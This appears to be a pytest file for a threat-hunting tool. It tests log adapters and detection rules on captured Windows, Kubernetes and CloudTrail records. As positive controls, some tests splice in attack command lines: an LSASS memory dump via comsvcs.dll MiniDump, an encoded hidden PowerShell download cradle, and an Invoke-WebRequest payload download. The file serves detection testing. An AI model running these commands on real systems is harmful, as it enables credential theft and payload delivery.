"""Adapter-to-rule contracts on captured records.

The synthetic generator is the rule authors' picture of a Windows estate; these fixtures
are what an estate actually emits (tests/fixtures/real_shaped/*/PROVENANCE.md). Each
test runs the full adapter path and then the rules, so a vocabulary the adapter emits
and a rule assumes are checked against each other on real shapes -- the gap that hid the
exec verb, the 101 status and the ServiceAccount spelling until M14
(docs/test-quality-root-causes.md, RC2/RC4).

Two kinds of assertion live here:

* pinned behaviour -- what the rules do on this corpus today, false positives included,
  so the cost cannot change unnoticed;
* strict-xfail targets -- what the M14 report says they should do. When a fix lands the
  target passes, the suite goes red on purpose, and the pinned assertion is updated in
  the same change.
"""

from __future__ import annotations

import json
import shutil
from pathlib import Path

import pytest

from ath.correlation import correlate
from ath.environment import build_environment_model
from ath.hunting import run_hunt
from ath.hunting.base import OFFICE_APPLICATIONS
from ath.hunting.finding import Severity
from ath.schema import EVENT_CONTROL, EVENT_LOGON, EVENT_NETWORK, EVENT_PROCESS, SIG_UNKNOWN
from ath.telemetry.cloudtrail_source import AUTH_EVENTS, CloudTrailSource
from ath.telemetry.k8s_audit_source import _EXEC_VERBS, K8sAuditSource
from ath.telemetry.loader import Telemetry
from ath.telemetry.winlogbeat_source import WinlogbeatSource
from ath.triage import Disposition, assess_findings

REAL = Path(__file__).parent / "fixtures" / "real_shaped"
DEDALE = REAL / "dedale"
K8S = REAL / "k8s_ci"
CLOUDTRAIL = REAL / "cloudtrail_shaped"


def _telemetry(result) -> Telemetry:
    return Telemetry(
        processes=result.tables[EVENT_PROCESS], network=result.tables[EVENT_NETWORK],
        logons=result.tables[EVENT_LOGON], controls=result.tables[EVENT_CONTROL],
    )


def _dedale_record(template: dict, **process) -> dict:
    """A record shaped exactly like the fixture's Sysmon 1 lines, with a new process."""
    record = json.loads(json.dumps(template))
    record["process"].update(process)
    record["winlog"]["record_id"] = 9_999_990 + hash(process.get("command_line", "")) % 1000
    record["@timestamp"] = "2024-12-25T09:30:00.000Z"
    return record


# ======================================================================================
# DEDALE: a Windows boot hour
# ======================================================================================


@pytest.fixture(scope="module")
def dedale():
    return WinlogbeatSource(DEDALE).load()


@pytest.fixture(scope="module")
def dedale_telemetry(dedale) -> Telemetry:
    return _telemetry(dedale)


@pytest.fixture(scope="module")
def dedale_sysmon1_template() -> dict:
    for line in (DEDALE / "client2_2024-12-25_boot.jsonl").read_text(encoding="utf-8").splitlines():
        record = json.loads(line)
        if record["winlog"]["event_id"] == 1 and record["process"].get("parent"):
            return record
    raise AssertionError("fixture has no Sysmon 1 record")


def test_dedale_corpus_is_the_boot_chain_the_generator_never_had(dedale_telemetry) -> None:
    procs = dedale_telemetry.processes
    assert (procs["process_name"] == "lsass.exe").any()
    assert (procs.loc[procs["process_name"] == "lsass.exe", "parent_process_name"] == "wininit.exe").all()
    assert (procs["parent_process_name"] == "CompatTelRunner.exe").any()
    assert (procs["process_name"] == "soffice.bin").any()
    assert set(dedale_telemetry.logons["logon_type"].dropna().astype(int)) >= {5}
    assert (procs["signature_status"] == SIG_UNKNOWN).all()


def test_dedale_benign_boot_hour_is_silent(dedale_telemetry) -> None:
    """Regression artifact of M14 (M15-3, fixed): ATH-004 fired on ``lsass.exe``'s own
    image path once per host per boot, 30 findings a day on a benign estate. The boot
    record is still in the corpus (asserted above); the rule now reads argv[0] as what
    the process *is*, not what it references, and the benign hour is silent."""
    assert run_hunt(dedale_telemetry).findings == []


@pytest.mark.xfail(strict=True, reason="M15-4: triage has 0% purchase when every real finding is HIGH+ (124/124 vetoed)")
def test_target_triage_has_purchase_on_a_benign_corpus(dedale_telemetry) -> None:
    findings = run_hunt(dedale_telemetry).findings
    assessments = assess_findings(findings, build_environment_model(dedale_telemetry))
    cleared = sum(1 for a in assessments.values() if a.disposition is Disposition.LIKELY_BENIGN)
    assert cleared > 0


def test_dedale_triage_pinned_veto_rate(dedale_telemetry) -> None:
    """Today: every finding on the benign corpus is vetoed by its own severity."""
    findings = run_hunt(dedale_telemetry).findings
    assessments = assess_findings(findings, build_environment_model(dedale_telemetry))
    assert all(
        any(v.name == "graded_high_by_detection" for v in a.vetoes) for a in assessments.values()
    )
    assert all(a.disposition is Disposition.LIKELY_MALICIOUS for a in assessments.values())


def test_spliced_credential_dump_fires_through_the_adapter(tmp_path, dedale_sysmon1_template) -> None:
    """Positive control through the real path: a comsvcs MiniDump shaped like a DEDALE
    record must fire ATH-004 with the spliced event cited, and it must be the only
    finding: the boot chain beside it, ``lsass.exe`` included, stays silent."""
    src = DEDALE / "client2_2024-12-25_boot.jsonl"
    spliced = _dedale_record(
        dedale_sysmon1_template, name="rundll32.exe", executable=r"C:\Windows\System32\rundll32.exe",
        command_line=r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\lsass.dmp full",
        parent={"name": "cmd.exe", "pid": 7777, "executable": r"C:\Windows\System32\cmd.exe"},
    )
    (tmp_path / "boot.jsonl").write_text(src.read_text(encoding="utf-8") + json.dumps(spliced) + "\n", encoding="utf-8")
    telemetry = _telemetry(WinlogbeatSource(tmp_path).load())
    findings = run_hunt(telemetry).findings
    dump = [f for f in findings if f.rule_id == "ATH-004" and "comsvcs.dll MiniDump" in f.metadata.get("indicators", ())]
    assert len(dump) == 1
    assert findings == dump
    cited = telemetry.processes[telemetry.processes["event_id"].isin(dump[0].event_ids)]
    assert (cited["process_name"] == "rundll32.exe").all()


def test_spliced_office_spawn_fires_through_the_adapter(tmp_path, dedale_sysmon1_template) -> None:
    spliced = _dedale_record(
        dedale_sysmon1_template, name="powershell.exe", executable=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
        parent={"name": "WINWORD.EXE", "pid": 7778, "executable": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"},
    )
    (tmp_path / "boot.jsonl").write_text(
        (DEDALE / "client2_2024-12-25_boot.jsonl").read_text(encoding="utf-8") + json.dumps(spliced) + "\n", encoding="utf-8")
    fired = {f.rule_id for f in run_hunt(_telemetry(WinlogbeatSource(tmp_path).load())).findings}
    assert {"ATH-001", "ATH-002"} <= fired


@pytest.mark.xfail(strict=True, reason="M15-5: LibreOffice (soffice.bin) opened the DEDALE macro document and is not an Office application to ATH-001")
def test_target_libreoffice_spawning_an_interpreter_is_an_office_spawn(tmp_path, dedale_sysmon1_template) -> None:
    spliced = _dedale_record(
        dedale_sysmon1_template, name="powershell.exe", executable=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line="powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri http://172.19.1.1/x.zip -OutFile C:\\Users\\client2\\AppData\\Roaming\\x.zip",
        parent={"name": "soffice.bin", "pid": 7779, "executable": r"C:\Program Files (x86)\LibreOffice 4\program\soffice.bin"},
    )
    (tmp_path / "boot.jsonl").write_text(
        (DEDALE / "client2_2024-12-25_boot.jsonl").read_text(encoding="utf-8") + json.dumps(spliced) + "\n", encoding="utf-8")
    fired = {f.rule_id for f in run_hunt(_telemetry(WinlogbeatSource(tmp_path).load())).findings}
    assert "ATH-001" in fired


@pytest.mark.xfail(strict=True, reason="M15-5: OFFICE_APPLICATIONS has no LibreOffice entry (DEDALE D15)")
def test_target_office_application_vocabulary_includes_libreoffice() -> None:
    assert {"soffice.bin", "soffice.exe"} & set(OFFICE_APPLICATIONS)


# ======================================================================================
# Kubernetes CI: a real apiserver
# ======================================================================================


@pytest.fixture(scope="module")
def k8s():
    return K8sAuditSource(K8S, cluster="ci").load()


@pytest.fixture(scope="module")
def k8s_telemetry(k8s) -> Telemetry:
    return _telemetry(k8s)


def test_k8s_corpus_execs_are_ingested_with_the_canonical_verb(k8s) -> None:
    """Regression artifact: before M14, 0 of 5,962 execs in this run were ingested."""
    controls = k8s.tables[EVENT_CONTROL]
    execs = controls[controls["resource_type"] == "pods/exec"]
    assert len(execs) == 3
    assert set(execs["verb"]) == {"exec"}
    assert set(execs["decision"]) == {"allowed"}


def test_k8s_corpus_exec_verbs_observed_are_all_mapped() -> None:
    """External truth for _EXEC_VERBS: every verb an apiserver used for pods/exec in the
    captured corpus must be in the set, or the next version's spelling silently blinds K8S-002."""
    observed = set()
    for line in (K8S / "kube-apiserver-audit.sample.log").read_text(encoding="utf-8").splitlines():
        event = json.loads(line)
        ref = event.get("objectRef") or {}
        if ref.get("resource") == "pods" and ref.get("subresource") == "exec":
            observed.add(event["verb"])
    assert observed
    assert observed <= _EXEC_VERBS


def test_k8s_corpus_subjects_are_spelled_as_callers(k8s) -> None:
    controls = k8s.tables[EVENT_CONTROL]
    grants = controls[controls["resource_type"] == "clusterrolebindings"]
    sa_targets = [t for t in grants["target_actor"] if "default" in t]
    assert sa_targets
    assert all(t.startswith("system:serviceaccount:") for t in sa_targets)


def test_k8s_corpus_representation_gaps_are_counted(k8s) -> None:
    """serviceaccounts/token and secrets reads have no table yet (M15-2): they must show
    up as unmapped issues, never vanish."""
    reasons = " ".join(i.reason for i in k8s.issues)
    assert "serviceaccounts/token" in reasons
    assert "get on secrets" in reasons


def test_k8s_corpus_pinned_findings_are_the_measured_false_positives(k8s_telemetry) -> None:
    findings = run_hunt(k8s_telemetry).findings
    assert {f.rule_id for f in findings} == {"K8S-001"}
    assert len(findings) == 4  # bootstrap system:masters + three per-test-namespace default SAs
    assert all(f.metadata.get("role_ref") == "cluster-admin" for f in findings)
    assert all(len(c.findings) == 1 for c in correlate(findings, k8s_telemetry))


@pytest.mark.xfail(strict=True, reason="M15-3: K8S-001 fires on every legitimate cluster-admin binding (2,070/day on CI); needs a prevalence term")
def test_target_k8s_benign_bootstrap_is_silent(k8s_telemetry) -> None:
    assert run_hunt(k8s_telemetry).findings == []


def test_k8s_exec_after_grant_fires_through_the_adapter(tmp_path) -> None:
    """Splice a grantee's get-verb exec after a real per-test cluster-admin grant."""
    lines = (K8S / "kube-apiserver-audit.sample.log").read_text(encoding="utf-8").splitlines()
    grant = next(json.loads(l) for l in lines if json.loads(l).get("objectRef", {}).get("resource") == "clusterrolebindings"
                 and "default" in json.dumps(json.loads(l).get("requestObject", {}).get("subjects", [])))
    subject = grant["requestObject"]["subjects"][0]
    grantee = f"system:serviceaccount:{subject['namespace']}:{subject['name']}"
    template = next(json.loads(l) for l in lines if json.loads(l).get("objectRef", {}).get("subresource") == "exec")
    exec_event = json.loads(json.dumps(template))
    exec_event["user"] = {"username": grantee, "groups": ["system:serviceaccounts"]}
    exec_event["auditID"] = "spliced-exec-1"
    exec_event["stageTimestamp"] = grant["stageTimestamp"][:17] + "59.000000Z"
    (tmp_path / "audit.log").write_text("\n".join(lines + [json.dumps(exec_event)]) + "\n", encoding="utf-8")
    fired = {f.rule_id for f in run_hunt(_telemetry(K8sAuditSource(tmp_path, cluster="ci").load())).findings}
    assert "K8S-002" in fired


# ======================================================================================
# CloudTrail, shaped from the real trail
# ======================================================================================


@pytest.fixture(scope="module")
def cloudtrail():
    return CloudTrailSource(CLOUDTRAIL).load()


@pytest.fixture(scope="module")
def cloudtrail_telemetry(cloudtrail) -> Telemetry:
    return _telemetry(cloudtrail)


def test_cloudtrail_shaped_service_invoked_calls_are_attributed(cloudtrail) -> None:
    """Regression artifact: 57,912 such records were dropped before M14 step 1."""
    logons = cloudtrail.tables[EVENT_LOGON]
    assert (logons["user"] == "config.amazonaws.com").sum() == 8
    assert not any("no usable principal" in i.reason for i in cloudtrail.issues)


def test_cloudtrail_shaped_flood_is_unmapped_and_counted(cloudtrail) -> None:
    unmapped = [i for i in cloudtrail.issues if "RunInstances" in i.reason]
    assert len(unmapped) == 40
    assert cloudtrail.rows_read == 68


def test_cloudtrail_shaped_auth_vocabulary_covers_the_corpus() -> None:
    """External truth for AUTH_EVENTS: every sts/signin event in the corpus is recognised."""
    import gzip, tarfile
    names = set()
    with tarfile.open(CLOUDTRAIL / "flaws_shaped_cloudtrail_logs.tar") as archive:
        for member in archive:
            if member.isfile():
                for record in json.loads(gzip.decompress(archive.extractfile(member).read()))["Records"]:
                    if record["eventSource"] in ("sts.amazonaws.com", "signin.amazonaws.com"):
                        names.add(record["eventName"])
    assert names <= AUTH_EVENTS


def test_cloudtrail_shaped_pinned_findings(cloudtrail_telemetry) -> None:
    findings = run_hunt(cloudtrail_telemetry).findings
    by_rule = {}
    for f in findings:
        by_rule.setdefault(f.rule_id, []).append(f)
    assert set(by_rule) == {"ATH-005"}
    burst = by_rule["ATH-005"]
    assert len(burst) == 1
    assert burst[0].user == "backup"
    assert "No successful logon" in burst[0].reason
    assert burst[0].severity is Severity.HIGH        # pinned defect, see target below
    assert "AWS-001" not in by_rule                   # attach was to backup, key creation for Level6 and denied


@pytest.mark.xfail(strict=True, reason="M15-3: ATH-005 grades a burst with no success HIGH (35/36 on flaws.cloud)")
def test_target_cloudtrail_no_success_burst_is_not_high(cloudtrail_telemetry) -> None:
    findings = [f for f in run_hunt(cloudtrail_telemetry).findings if f.rule_id == "ATH-005"]
    assert findings and all(f.severity not in (Severity.HIGH, Severity.CRITICAL) for f in findings)
